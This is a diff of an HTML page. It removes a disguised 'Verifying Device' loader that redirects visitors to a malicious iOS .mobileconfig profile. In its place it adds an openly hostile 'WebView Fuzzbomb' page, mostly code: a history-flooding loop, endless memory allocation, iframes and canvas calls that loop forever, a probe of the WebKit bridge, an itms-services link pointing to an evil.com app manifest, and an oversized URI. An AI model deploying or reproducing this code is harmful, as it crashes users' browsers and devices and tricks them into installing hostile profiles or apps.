@@ -1,24 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Loader</title>
+  <title>💥 iOS WebView Fuzzbomb 💥</title>
+  <style>
+    body { background-color: black; color: lime; font-family: monospace; }
+  </style>
 </head>
 <body>
-  <h1>Verifying Device...</h1>
-  <canvas id="g" width="4096" height="4096"></canvas>
+  <h1>FUCK YOUR WEBVIEW</h1>
+  <p>Launching full-spectrum chaos...</p>
+
   <script>
-    const c = document.getElementById('g').getContext('2d');
-    for (let i=0; i<1000; i++) {
-      c.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-      c.fillRect(Math.random()*4096,Math.random()*4096,512,512);
+    // 🍔 History Bomb
+    for (let i = 0; i < 50000; i++) {
+      history.pushState({}, '', '#' + Math.random());
     }
-    const img = new Image();
-    img.src = "data:image/jpeg;base64,/9j/4AAQ...BAD_BASE64...";
-    img.onload = () => c.drawImage(img,0,0);
+
+    // 🧠 Memory Bloat
     setTimeout(() => {
-      window.location = "https://tachoss.github.io/hostity/malicious.mobileconfig";
-    }, 2500);
+      let memoryAbuse = [];
+      while (true) memoryAbuse.push(new Array(1e6).fill("💣"));
+    }, 1000);
+
+    // 🪞 iframe Bomb
+    for (let i = 0; i < 50; i++) {
+      let iframe = document.createElement('iframe');
+      iframe.srcdoc = `<script>while(true){}</script>`;
+      iframe.width = 1;
+      iframe.height = 1;
+      document.body.appendChild(iframe);
+    }
+
+    // 🎨 Canvas Crasher
+    let canvas = document.createElement('canvas');
+    document.body.appendChild(canvas);
+    let ctx = canvas.getContext('2d');
+    setTimeout(() => {
+      while (true) {
+        ctx.arc(1e10, 1e10, 1e10, 0, 2 * Math.PI);
+      }
+    }, 500);
+
+    // 🧪 JavaScript Bridge Probe
+    try {
+      window.webkit.messageHandlers.nonexistent.postMessage("probe");
+    } catch (e) {}
+
+    // 🔗 Protocol Handler Test
+    let a = document.createElement('a');
+    a.href = 'itms-services://?action=download-manifest&url=https://evil.com/manifest.plist';
+    a.innerText = 'CLICK TO TRIGGER itms-services';
+    document.body.appendChild(a);
+
+    // 🐍 Giant URI Abuse
+    let hugeLink = document.createElement('a');
+    hugeLink.href = 'http://example.com/' + 'A'.repeat(100000);
+    hugeLink.innerText = 'Oversized URI';
+    document.body.appendChild(hugeLink);
   </script>
 </body>
 </html>
